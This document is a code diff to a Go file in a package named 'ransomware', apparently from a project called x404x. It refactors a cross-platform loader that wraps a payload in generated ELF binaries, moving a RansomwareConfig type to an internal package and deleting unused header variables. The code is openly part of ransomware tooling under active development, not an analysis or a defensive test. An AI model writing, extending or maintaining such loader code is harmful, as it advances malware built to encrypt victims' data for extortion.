@@ -1,5 +1,7 @@
 package ransomware
 
+import rw "github.com/ruby570bocadito/x404x/internal/ransomware"
+
 import (
 	"bytes"
 	"crypto/rand"
@@ -15,7 +17,7 @@ import (
 )
 
 type CrossPlatformLoader struct {
-	config     *RansomwareConfig
+	config     *rw.RansomwareConfig
 	targetOS   string
 	targetArch string
 	payload    []byte
@@ -30,7 +32,7 @@ type PlatformLoader struct {
 	Entry    uint32
 }
 
-func NewCrossPlatformLoader(cfg *RansomwareConfig) *CrossPlatformLoader {
+func NewCrossPlatformLoader(cfg *rw.RansomwareConfig) *CrossPlatformLoader {
 	return &CrossPlatformLoader{
 		config:     cfg,
 		syscallMap: make(map[string]uint32),
@@ -53,11 +55,8 @@ func (c *CrossPlatformLoader) GenerateELF(payload []byte) ([]byte, error) {
 		2, 1, 1, 0,
 	}
 
-	entrySize := uint64(0x78)
 	phSize := uint64(0x38)
 	phCount := uint16(2)
-	shSize := uint64(0x40)
-	shCount := uint16(3)
 
 	hdr := make([]byte, 64)
 	copy(hdr[0:4], elfHdr)
